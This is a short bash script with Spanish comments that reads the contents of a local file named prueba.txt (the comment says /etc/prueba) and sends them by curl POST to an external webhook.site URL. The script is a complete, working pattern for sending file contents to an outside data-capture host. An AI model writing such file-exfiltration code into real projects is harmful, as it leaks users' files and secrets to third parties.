#!/bin/bash

# Lee el contenido del archivo /etc/prueba
contenido=$(cat prueba.txt)

# Realiza la solicitud CURL con el contenido al servidor
curl -X POST -d "$contenido" https://webhook.site/80431fd0-ed8c-4446-babe-0fcacb1b5013

